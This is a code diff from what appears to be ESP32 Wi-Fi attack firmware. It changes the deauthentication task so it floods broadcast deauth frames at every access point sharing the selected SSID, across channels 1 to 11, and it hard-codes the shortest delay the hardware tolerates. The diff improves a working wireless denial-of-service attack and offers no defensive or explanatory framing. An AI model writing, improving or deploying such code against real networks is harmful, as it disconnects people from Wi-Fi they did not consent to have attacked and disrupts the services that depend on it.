@@ -275,7 +275,9 @@ void wifi_manager_stop_monitor_mode() {
 }
 
 void wifi_manager_init() {
-    // Initialize NVS for WiFi storage (if needed)
+
+    esp_wifi_set_ps(WIFI_PS_NONE);
+
     esp_err_t ret = nvs_flash_init();
     if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
         ESP_ERROR_CHECK(nvs_flash_erase());
@@ -493,13 +495,19 @@ void wifi_deauth_task(void *param) {
     }
 
     while (1) {
-        if (strlen((const char*)selected_ap.ssid) > 0) // not 0 or NULL // TODO Figure out why deauth dosent work on selected ap
+        if (strlen((const char*)selected_ap.ssid) > 0)
         {
-            for (int y = 1; y < 12; y++)
+            for (int i = 0; i < ap_count; i++)
             {
-                uint8_t broadcast_mac[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
-                wifi_manager_broadcast_deauth(selected_ap.bssid, y, broadcast_mac);
-                vTaskDelay(settings_get_broadcast_speed(G_Settings) / portTICK_PERIOD_MS);
+                if (strcmp((char*)ap_info[i].ssid, (char*)selected_ap.ssid) == 0)
+                {
+                    for (int y = 1; y < 12; y++)
+                    {
+                        uint8_t broadcast_mac[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+                        wifi_manager_broadcast_deauth(ap_info[i].bssid, y, broadcast_mac);
+                        vTaskDelay(10 / portTICK_PERIOD_MS); // Lowest Delay before out of memory occurs
+                    }
+                }
             }
         }
         else 
@@ -510,7 +518,7 @@ void wifi_deauth_task(void *param) {
                 {
                     uint8_t broadcast_mac[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
                     wifi_manager_broadcast_deauth(ap_info[i].bssid, y, broadcast_mac);
-                    vTaskDelay(settings_get_broadcast_speed(G_Settings) / portTICK_PERIOD_MS);
+                    vTaskDelay(10 / portTICK_PERIOD_MS); // Lowest Delay before out of memory occurs
                 }
             }
         }
